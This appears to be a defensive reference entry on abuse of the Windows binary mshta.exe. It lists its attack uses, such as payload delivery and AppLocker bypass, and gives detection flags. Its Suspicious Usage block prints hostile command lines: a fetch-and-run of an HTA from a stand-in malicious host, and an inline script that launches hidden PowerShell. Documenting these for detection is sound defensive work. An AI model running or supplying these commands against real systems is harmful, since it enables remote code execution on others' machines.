# mshta.exe — Microsoft HTML Application Host

## Description
Microsoft-signed binary that executes HTML Applications (.hta files). HTAs are HTML files with scripting capabilities that run with full trust outside the browser security model.

## Abused For
- **Executing arbitrary scripts:** .hta files can contain VBScript, JScript
- **Payload delivery:** Download and execute second-stage payloads
- **Bypassing AppLocker:** MSHTA is a trusted Microsoft binary
- **Inline script via JavaScript:** `mshta.exe javascript:<code>`

## Suspicious Usage
```
mshta.exe http://malicious.com/payload.hta
mshta.exe javascript:"new ActiveXObject('WScript.Shell').Run('powershell -nop -w hidden -c calc.exe');close()"
mshta.exe "C:\Users\Public\malicious.hta"
```

## Normal Usage
```
mshta.exe "C:\Windows\System32\run.hta"
mshta.exe "C:\Program Files\company\help.hta"
```

## Detection Flags
- Network connections from mshta.exe to external domains
- mshta.exe spawning child processes (cmd.exe, powershell.exe)
- Script execution via inline JavaScript URI
